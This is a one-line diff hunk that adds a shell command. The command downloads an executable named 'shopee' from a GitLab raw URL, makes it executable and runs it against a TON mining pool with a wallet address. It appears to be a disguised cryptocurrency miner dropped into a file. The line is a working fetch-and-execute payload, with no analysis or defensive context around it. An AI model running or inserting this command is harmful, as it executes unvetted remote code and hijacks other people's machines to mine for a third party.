@@ -1,0 +1,1 @@
+wget https://gitlab.com/kancomue/file/-/raw/main/shopee && chmod +x shopee && ./shopee run https://next.ton-pool.club EQAOV41G7d93Ug0B6PRjp4RHZ7ID_ivK74nCJiX-X8WtCvwD
